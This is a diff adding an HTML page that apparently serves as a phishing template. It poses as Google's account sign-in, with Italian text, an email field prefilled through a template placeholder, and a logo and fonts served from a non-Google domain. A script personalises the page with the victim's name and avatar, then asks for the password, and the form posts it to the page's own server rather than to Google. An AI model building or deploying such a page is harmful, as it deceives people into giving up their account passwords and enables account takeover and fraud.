@@ -1,0 +1,390 @@
+<!DOCTYPE html><html lang="fr"><head>
+    <meta charset="UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Accesso - Account Google</title>
+    <link rel="shortcut icon" href="https://passandsecure.fr/logo_google-1.png"/>
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"/>
+    <style>
+        @font-face {
+            font-family: 'Google Sans';
+            src: url('https://passandsecure.fr/font-google/GoogleSans-Regular.woff2') format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Google Sans';
+            src: url('https://passandsecure.fr/font-google/GoogleSans-Bold.woff2') format('woff2');
+            font-weight: 500;
+            font-style: normal;
+        }
+        body {
+            background-color: #f0f4f9;
+            font-family: 'Google Sans', sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 28px;
+            width: 1140px;
+            height: 400px;
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px; /* Adjusted to add space below the login container */
+        }
+        .login-left, .login-right {
+            width: 50%;
+        }
+        .login-left {
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            margin-top: -140px;
+        }
+        .login-header {
+            margin-bottom: 20px;
+        }
+        .login-header img {
+            height: 45px;
+            margin-bottom: 10px;
+        }
+        h2 {
+            font-size: 36px;
+            line-height: 44px;
+            color: #1f1f1f;
+            margin-bottom: 10px;
+            font-weight: 400;
+        }
+        p {
+            font-size: 16px;
+            line-height: 24px;
+            color: #1f1f1f;
+            margin-bottom: 20px;
+        }
+        .form-group input {
+            width: 96%;
+            padding: 28px;
+            margin-bottom: 10px;
+            margin-left: 23px;
+            border: 1px solid grey;
+            border-radius: 4px;
+            font-size: 18px;
+            color: black;
+        }
+        .form-group input::placeholder {
+            width: 96%;
+            padding: 28px;
+            margin-bottom: 10px;
+            margin-left: 23px;
+            border: 1px solid grey;
+            border-radius: 4px;
+            font-size: 15px;
+        }
+        .form-group-3 input {
+            width: 96%;
+            padding: 28px;
+            margin-bottom: 10px;
+            margin-left: 23px;
+            border: 1px solid grey;
+            border-radius: 4px;
+            font-size: 15px;
+            color: black;
+        }
+        .form-group-3 input::placeholder {
+            width: 96%;
+            padding: 28px;
+            margin-bottom: 10px;
+            margin-left: 23px;
+            border: 1px solid grey;
+            border-radius: 4px;
+            font-size: 15px;
+        }
+        .form-group-2 input[type="checkbox"] {
+            transform: scale(1.2);
+            background-color: #fff;
+            border: 3px solid black;
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+            position: relative;
+            display: inline-block;
+            margin-left: 5px;
+            margin-right: 17px;
+            vertical-align: middle;
+        }
+        .form-group-2 input[type="checkbox"]:checked::before {
+            content: '\2713';
+            font-size: 17px;
+            position: absolute;
+            border: 3px solid black;
+            top: -9px;
+            left: -1px;
+        }
+        .btn-link {
+            font-size: 0.875rem;
+            color: #0b57d0;
+            font-weight: 500;
+            text-decoration: none;
+            position: relative;
+            margin-left: 23px;
+        }
+        
+        .btn-link:hover {
+            background-color: #F0F4F9;
+            color: #0b57d0;
+            margin-left: 21px;
+            padding:2px;
+            border-radius: 15px;
+            text-decoration: none;
+        }
+        
+        .btn-link:hover::before {
+            opacity: 0.1;
+        }
+        .info-text {
+            font-size: 14px;
+            line-height: 20px;
+            color: #444746;
+            margin: 10px 0;
+            margin-left: 23px;
+            margin-top: 45px;
+        }
+        .info-link {
+            font-size: 14px;
+            line-height: 20px;
+            color: #0b57d0;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        
+        .info-link:hover {
+            background-color: #F0F4F9;
+            color: #0b57d0;
+            margin-left: -2px;
+            padding:2px;
+            border-radius: 15px;
+            text-decoration: none;
+        }
+        
+        .info-link-2 {
+            font-size: 14px;
+            line-height: 20px;
+            color: #0b57d0;
+            font-weight: 500;
+            text-decoration: none;
+            margin-left: 270px;
+        }
+        
+        .info-link-2:hover {
+            background-color: #F0F4F9;
+            color: #0b57d0;
+            padding: 10px 20px 10px 20px;
+            margin-left: 250px;
+            border-radius: 30px;
+            text-decoration: none;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .btn-primary {
+            background-color: #0B57D0;
+            border-color: #0B57D0;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 500;
+            width: 19%;
+            padding: 9px;
+            border-radius: 20px;
+        }
+        .bottom-links {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            max-width: 1095px;
+        }
+        .bottom-links-2 {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            max-width: 1095px;
+        }
+        .custom-text {
+            font-family: 'Google Sans', sans-serif;
+            font-size: 13px;
+            line-height: 20px;
+            color: #1f1f1f;
+        }
+        
+        .bottom-link:hover {
+            background-color:#EBEBEB;
+            color: black;
+            padding:8px;
+            border-radius: 8px;
+            text-decoration: none;
+            margin-left:-8px;
+        }
+        .bottom-link-2:hover {
+            background-color:#EBEBEB;
+            color: black;
+            padding:8px;
+            border-radius: 8px;
+            text-decoration: none;
+            margin-left:-8px;
+        }
+
+        #emailButton {
+            display: none;
+            max-width: 80%;
+            padding: 3px;
+            margin-bottom: 10px;
+            border: 1px solid grey;
+            border-radius: 15px;
+            background-color: white;
+            text-align: left;
+            cursor: pointer;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .avatar {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            margin-right: 10px;
+            font-size: 16px;
+        }
+        .arrow {
+            margin-right:15px;
+        }
+        .arrow-2 {
+            margin-left:65px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="login-container">
+        <div class="login-left">
+            <div class="login-header">
+                <img src="https://passandsecure.fr/logo_google-1.png" alt="Logo Google"/>
+            </div>
+            <h2 id="userName">Accesso</h2>
+            <button id="emailButton" onclick="showEmailSection()"></button>
+            <p id="googleAccountText">Utilizza il tuo account Google</p>
+        </div>
+        <div class="login-right">
+            <form id="loginForm" method="post" action="">
+                <div id="emailSection">
+                    <div class="form-group" style="margin-bottom: -3px;">
+                        <input type="email" class="form-control" id="email" placeholder="Indirizzo email o numero di telefono" value="{{.Email}}" required=""/>
+                    </div>
+                    <a href="https://accounts.google.com/signin/v2/usernamerecovery?" class="btn-link">Indirizzo email dimenticato?</a>
+                    <div class="info-text">
+                        Se non è il tuo computer, utilizza una finestra di navigazione in incognito per accedere. <a href="https://support.google.com/accounts?p=signin_privatebrowsing&amp;hl=fr" class="info-link" target="_blank" rel="noopener">Scopri di più sull'utilizzo della modalità ospite</a>
+                    </div>
+                    <div class="footer-links">
+                        <a href="#" class="info-link-2" style="margin-bottom: -110px;">Crea un account</a>
+                        <button type="button" class="btn btn-primary" style="margin-bottom: -110px;" onclick="showPasswordSection()">Avanti</button>
+                    </div>
+                </div>
+                <div id="passwordSection" style="display: none;">
+                    <div class="form-group-3" style="margin-bottom: -3px;">
+                        <input type="password" class="form-control" id="password" placeholder="Inserisci la tua password" required="" name="password"/>
+                    </div>
+                    <div class="form-group-2" style="margin-left: 23px;">
+                        <input type="checkbox" id="showPasswordCheckbox" class="custom-checkbox" onclick="togglePasswordVisibility()"/>
+                        <label for="showPasswordCheckbox">Mostra password</label>
+                    </div>
+                    <div class="footer-links">
+                        <a href="https://www.google.com/url?sa=t&amp;source=web&amp;rct=j&amp;opi=89978449&amp;url=https://takeout.google.com" class="info-link-2" style="margin-bottom: -220px; margin-left: 240px;">Password dimenticata?</a>
+                        <button type="submit" class="btn btn-primary" style="margin-bottom: -220px;">Avanti</button>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+    <div class="bottom-links custom-text">
+        <div>
+        <a href="#" class="bottom-link custom-text" style="margin-right:650px;">Francese (Francia)
+        <span class="arrow-2"><i class="fa-solid fa-caret-down"></i></span>
+        </a>
+        
+            <a href="https://support.google.com/accounts?hl=fr&amp;p=account_iph" class="bottom-link-2 custom-text" style="margin-right: 30px;" target="_blank" rel="noopener">Aiuto</a>
+            <a href="https://accounts.google.com/TOS?loc=FR&amp;hl=fr&amp;privacy=true" class="bottom-link-2 custom-text" style="margin-right: 30px;" target="_blank" rel="noopener">Privacy</a>
+            <a href="https://accounts.google.com/TOS?loc=FR&amp;hl=fr" class="bottom-link-2 custom-text" target="_blank" rel="noopener">Termini</a>
+        </div>
+    </div>
+
+    <script>
+        function showPasswordSection() {
+            const email = document.getElementById('email').value;
+            const emailParts = email.split('@')[0].split('.');
+            const firstName = emailParts[0].charAt(0).toUpperCase() + emailParts[0].slice(1);
+            const lastName = emailParts[1].toUpperCase();
+            const userName = firstName + ' ' + lastName;
+
+            const initial = email.charAt(0).toUpperCase();
+            const randomColor = '#' + Math.floor(Math.random() * 16777215).toString(16);
+
+            document.getElementById('userName').textContent = userName;
+
+            const emailButton = document.getElementById('emailButton');
+            emailButton.innerHTML = `
+                <div style="display: flex; align-items: center;">
+                    <div class="avatar" style="background-color: ${randomColor};">${initial}</div>
+                    <span>${email}</span>
+                </div>
+                <i class="fa-solid fa-caret-down arrow"></i>
+            `;
+            emailButton.style.display = 'flex';
+
+            document.getElementById('googleAccountText').style.display = 'none';
+            document.getElementById('emailSection').style.display = 'none';
+            document.getElementById('passwordSection').style.display = 'block';
+        }
+
+        function showEmailSection() {
+            document.getElementById('userName').textContent = 'Accesso';
+            document.getElementById('emailButton').style.display = 'none';
+            document.getElementById('googleAccountText').style.display = 'block';
+            document.getElementById('passwordSection').style.display = 'none';
+            document.getElementById('emailSection').style.display = 'block';
+        }
+
+        function togglePasswordVisibility() {
+            const passwordField = document.getElementById('password');
+            if (document.getElementById('showPasswordCheckbox').checked) {
+                passwordField.type = 'text';
+            } else {
+                passwordField.type = 'password';
+            }
+        }
+
+        // Trigger the showPasswordSection function on page load to display the email avatar
+        document.addEventListener('DOMContentLoaded', (event) => {
+            showPasswordSection();
+        });
+    </script>
+</body>
+</html>
+
+<!------.-. .-')         (`-.    _  .-')   
+        \  ( OO )      _(OO  )_ ( \( -O )  
+        ,--. ,--.  ,--(_/   ,. \ ,------.  
+        |  .'   /  \   \   /(__/ |   /`. ' 
+        |      /,   \   \ /   /  |  /  | | 
+        |     ' _)   \   '   /,  |  |_.' | 
+        |  .   \      \     /__) |  .  '.' 
+        |  |\   \      \   /     |  |\  \  
+        `--' '--'       `-'      `--' '--'------->
